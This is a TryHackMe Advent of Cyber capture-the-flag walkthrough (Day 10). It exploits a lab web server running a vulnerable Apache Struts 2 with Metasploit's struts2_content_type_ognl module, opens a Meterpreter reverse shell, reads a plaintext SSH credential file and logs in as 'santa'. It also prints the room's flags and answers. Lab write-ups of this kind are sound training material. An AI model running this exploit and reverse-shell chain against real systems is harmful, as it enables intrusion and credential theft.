# TryHackMe [Advent of Cyber 1](https://tryhackme.com/room/25daysofchristmas) Day 10
### References
* Spring, B. (2019, December 9). Metasploit: Basics. TryHackMe Blog; TryHackMe Blog. https://blog.tryhackme.com/metasploit/
## Compromise the web server using Metasploit. What is flag1?
* According to the [blog post](https://blog.tryhackme.com/metasploit/):
> The Christmas challenge will include a web server that is running a vulnerable version of Apache Struts 2 (an open-source web application framework for Java applications).
* The [blog post](https://blog.tryhackme.com/metasploit/) uses `exploit/multi/http/struts2_content_type_ognl`:
![`exploit/multi/http/struts2_content_type_ognl`](https://blog.tryhackme.com/content/images/2019/12/Screenshot-from-2019-12-09-20-48-19.png)

```bash
$ msfconsole -q
msf6 > search struts2

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/struts_dev_mode               2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   1  exploit/multi/http/struts2_multi_eval_ognl       2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
   2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3  exploit/multi/http/struts2_rest_xstream          2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
   4  exploit/multi/http/struts2_code_exec_showcase    2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
   5  exploit/multi/http/struts_code_exec_classloader  2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   6  exploit/multi/http/struts2_content_type_ognl     2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
   7  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution

msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 10.10.194.217
RHOSTS => 10.10.194.217
msf6 exploit(multi/http/struts2_content_type_ognl) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.action
TARGETURI => /showcase.action
msf6 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 10.4.32.172
LHOST => 10.4.32.172
msf6 exploit(multi/http/struts2_content_type_ognl) > run

[*] Started reverse TCP handler on 10.4.32.172:4444 
[*] Sending stage (980808 bytes) to 10.10.194.217
[*] Meterpreter session 1 opened (10.4.32.172:4444 -> 10.10.194.217:41814) at 2021-06-29 15:52:56 +1000

meterpreter > shell
Process 52 created.
Channel 1 created.
$ find / 2>>/dev/null | grep -i "flag"
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/usr/lib/x86_64-linux-gnu/perl/5.20.2/bits/waitflags.ph
/usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
/flag-dir
$ exit
meterpreter > cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
THM{3ad96bb13ec963a5ca4cb99302b37e12}
```

**Flag 1**: `THM{3ad96bb13ec963a5ca4cb99302b37e12}`
## Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
```bash
meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2019-12-09 08:12:45 +1100  santa

meterpreter > cd santa
meterpreter > ls
Listing: /home/santa
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  30    fil   2019-12-09 08:12:44 +1100  ssh-creds.txt

meterpreter > cat ssh-creds.txt 
santa:rudolphrednosedreindeer
```

**Answer**: `rudolphrednosedreindeer`
## Who is on line 148 of the naughty list?
```bash
 ssh santa@10.10.194.217
santa@10.10.194.217's password: rudolphrednosedreindeer
[santa@ip-10-10-194-217 ~]$ sed '148!d' naughty_list.txt 
Melisa Vanhoose
```
**Answer**: `Melisa Vanhoose`
## Who is on line 52 of the nice list?
```bash
[santa@ip-10-10-194-217 ~]$ sed '52!d' nice_list.txt 
Lindsey Gaffney
```
**Answer**: `Lindsey Gaffney`